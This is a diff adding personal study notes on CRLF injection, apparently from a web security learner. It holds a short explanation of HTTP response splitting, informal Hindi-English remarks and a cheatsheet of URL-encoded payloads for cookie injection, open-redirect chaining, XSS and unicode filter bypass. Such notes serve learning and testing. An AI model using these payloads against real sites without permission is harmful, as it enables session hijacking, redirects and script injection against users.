@@ -1,0 +1,65 @@
+
+------------------------- resource  ---------------------------
+
+https://www.netsparker.com/blog/web-security/crlf-http-header/
+
+
+
+------------------------------------------ end ---------------------------------
+
+
+
+
+If the attacker inserts a double CRLF, they can prematurely terminate HTTP headers and inject content before the actual website content. The injected content can contain JavaScript code. It can also be formulated so that the actual website content coming from the web server is ignored by the web browser. This is how HTTP response splitting is used in combination with Cross-site Scripting (XSS).
+
+
+
+
+
+
+
+
+crlf injection attack 
+
+carraige return line feed    \r  \n 
+
+carraige return matlab end line 
+
+line feed matlab \n new line 
+
+
+get requests  payload %0d%0a     %0d matlab \r  and %0a matlab \n  url encoded 
+
+GET /%0d%0aSet-Cookie:CRLFInjection=PreritPathak HTTP/1.1
+
+ye requests bejhne ka or response me check karne  cookie value
+
+
+
+
+
+CHEATSHEET
+1. HTTP Response Splitting
+• /%0D%0ASet-Cookie:mycookie=myvalue
+
+2. CRLF chained with Open Redirect
+• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2 
+• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
+• /google.com/%2F..%0D%0AHeader-Test:test2
+• /%0d%0aLocation:%20http://example.com
+
+3. CRLF Injection to XSS
+• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
+• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+
+4. Filter Bypass
+• %E5%98%8A = %0A = \u560a
+• %E5%98%8D = %0D = \u560d
+• %E5%98%BE = %3E = \u563e (>)
+• %E5%98%BC = %3C = \u563c (<)
+• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
+
+
+
+
+
